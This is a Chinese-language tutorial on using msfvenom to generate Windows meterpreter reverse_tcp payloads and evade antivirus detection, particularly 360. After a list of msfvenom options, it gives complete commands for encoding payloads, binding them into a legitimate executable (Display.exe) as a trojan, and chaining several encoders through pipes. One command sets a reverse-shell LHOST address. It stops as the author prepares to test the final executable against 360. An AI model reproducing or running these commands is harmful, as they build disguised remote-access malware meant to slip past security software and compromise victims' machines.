    我们这里使用msfvenom来生成payload。众所周知，msf现在被盯死了，用它做免杀实在难以突破杀软，尤其还是“野蛮杀法”的360，实在是太强悍了。


   我们这里选用频率最高的“windows/meterpreter/reverse_tcp”，这也是被各大杀软盯得最紧的一个。


一、msfvenom常用参数

-p, –payload < payload> 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的
-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
-n, –nopsled < length> 为payload预先指定一个NOP滑动长度
-f, –format < format> 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)
-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload
-a, –arch < architecture> 指定payload的目标架构，例如x86 | x64 | x86_64
–platform < platform> 指定payload的目标平台
-s, –space < length> 设定有效攻击荷载的最大长度，就是文件大小
-b, –bad-chars < list> 设定规避字符集，指定需要过滤的坏字符例如：不使用 '\x0f'、'\x00';
-i, –iterations < count> 指定payload的编码次数
-c, –add-code < path> 指定一个附加的win32 shellcode文件
-x, –template < path> 指定一个自定义的可执行文件作为模板,并将payload嵌入其中
-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行
–payload-options 列举payload的标准选项
-o, –out < path> 指定创建好的payload的存放位置
-v, –var-name < name> 指定一个自定义的变量，以确定输出格式
–shellest 最小化生成payload
-h, –help 查看帮助选项
–help-formats 查看msf支持的输出格式列表

1）比如想查看windows/meterpreter/reverse_tcp支持什么平台、哪些选项，可以使用msfvenom -p windows/meterpreter/reverse_tcp --list-options。


2）使用msfvenom --list encoders可查看所有编码器。


3）类似可用msfvenom --list命令查看的还有payloads, encoders, nops, platforms, archs, encrypt, formats。


二、免杀制作

1、编码方式：

    用msfvenom进行编码方式进行混淆，效果不好，编码过后的程序常常被杀软杀，更不提360那么强悍的杀软了。


如：

    使用x86/shikata_ga_nai生成payload，参数-i为编码次数，这里设置15次，并使用了-b参数去掉payload中的空字符。

msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=3333 -e x86/shikata_ga_nai -b"\x00" -i15 -fexe -o payload2.exe


但这样生成的payload2.exe并不能过掉360，一样会被杀。


    由于shikata_ga_nai编码技术是多态的，也就是说每次生成的payload文件都不⼀样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有⼀定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。


2、捆绑方式：

    在生成payload时可以使用捆绑功能，使用msfvenom的-x参数可以指定⼀个自定义的可执行文件作为模板,并将payload嵌入其中，-x后面跟对应文件路径就可以。这里使用一个正规的Display.exe作为被捆绑测试软件。生成payload命令如下：

msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=3333 -x Display.exe -f exe -o payload2.exe


但这样生成的payload2.exe并不能过掉360，一样会被杀。


3、编码+捆绑方式：

    msfvenom的encoder编码器可以对payload进行⼀定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。如下命令，使用管道让msfvenom对攻击载荷多重编码，先用shikata_ga_nai编码20次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成以Display.exe为模板的可执行文件。    


sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.213.128 LPORT=3333 -a x86 --platform windows -e x86/shikata_ga_nai -i 20 -f raw | msfvenom -e x86/alpha_upper -a x86 --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 10 -f exe -x DisplaySample.exe -k -o d128.exe


生成了d128.exe，我们放入360机器的win机器中运行，看看效果。
